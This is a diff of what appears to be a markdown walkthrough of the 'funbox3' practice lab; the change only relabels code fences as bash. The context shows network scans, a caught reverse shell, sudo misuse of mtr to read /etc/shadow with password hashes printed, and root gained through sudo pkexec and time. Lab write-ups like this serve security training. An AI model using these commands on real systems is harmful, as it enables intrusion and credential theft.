@@ -25,7 +25,7 @@
 
 `sudo nmap -sV -sC -T4 192.168.211.111`
 
-```
+```bash
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
@@ -35,7 +35,7 @@ PORT   STATE SERVICE VERSION
 
 An additional all ports scan reveals the following:
 
-```
+```bash
 PORT      STATE SERVICE VERSION
 33060/tcp open  mysqlx?
 ```
@@ -46,7 +46,7 @@ PORT      STATE SERVICE VERSION
 
 `gobuster dir -u http://192.168.211.111 -t 100 -r -x php,txt,html -w dir-med.txt`
 
-```
+```bash
 /admin                (Status: 200) [Size: 3263]
 /header.php           (Status: 200) [Size: 1666]
 /store                (Status: 200) [Size: 3998]
@@ -126,7 +126,7 @@ I start up a listener on my system and then visit the **books** link on the top 
 
 ![](images/funboxeasy12.png)
 
-```
+```bash
 listening on [any] 4444 ...
 connect to [192.168.49.211] from (UNKNOWN) [192.168.211.111] 44506
 Linux funbox3 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
@@ -154,7 +154,7 @@ Upgrading the shell with python3:
 
 `wc -c /var/www/local.txt`
 
-```
+```bash
 33 /var/www/local.txt
 ```
 
@@ -162,7 +162,7 @@ I look for **cronjobs** but there aren't any that we can see.
 
 Looking at **/etc/passwd** shows us 2 users with login shells:
 
-```
+```bash
 root:x:0:0:root:/root:/bin/bash
 tony:x:1000:1000:#:/home/tony:/bin/bash
 ```
@@ -175,7 +175,7 @@ I head over to the **/home/tony** directory and find this file waiting:
 
 And viewing it:
 
-```
+```bash
 ssh: <REDACTED>
 gym/admin: <REDACTED>
 /store: admin@admin.com <REDACTED>
@@ -187,7 +187,7 @@ gym/admin: <REDACTED>
 
 I ssh over as tony using the password we just found:
 
-```
+```bash
 tony@funbox3:~$ whoami
 tony
 tony@funbox3:~$ hostname
@@ -196,7 +196,7 @@ funbox3
 
 Checking `sudo -l`:
 
-```
+```bash
 Matching Defaults entries for tony on funbox3:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -222,7 +222,7 @@ After playing around with these you can use **/usr/bin/mtr** to read files you a
 
 `sudo /usr/bin/mtr --raw -F "/etc/shadow"`
 
-```
+```bash
 /usr/bin/mtr: Failed to resolve host: root:$6$vhQCRnZ7cB8CmPHi$FGwOfBLodnjYboCNgkE.e5fN7J3qEdXahyKIrSR1lt3eeVIdHBfUvl8Dow4/CYLAAk.7YKVDOqKSG2pLLnHUq/:18565:0:99999:7:::: Name or service not known
 /usr/bin/mtr: Failed to resolve host: tony:$6$3CcVDtP8rpQ/g1AY$tpRzq31JEsdsbEi4AD7wG5XfgrEwsr0j4vHqSQmkTpYvx.yHrB/xv3pv8Xlko/5P4vzW4v8BC3tG/YPtbbzVN0:18473:0:99999:7:::: Name or service not known
 ```
@@ -237,7 +237,7 @@ And you can escalate privileges to root using either **pkexec** or **time**.
 
 `sudo /usr/bin/pkexec /bin/bash`
 
-```
+```bash
 tony@funbox3:~$ sudo /usr/bin/pkexec /bin/bash
 root@funbox3:~# whoami
 root
@@ -250,7 +250,7 @@ root@funbox3:~#
 
 `sudo /usr/bin/time /bin/bash`
 
-```
+```bash
 tony@funbox3:~$ sudo /usr/bin/time /bin/bash
 root@funbox3:~# whoami
 root
@@ -265,7 +265,7 @@ Checking for our flag:
 
 `wc -c /root/proof.txt`
 
-```
+```bash
 33 /root/proof.txt
 ```
 
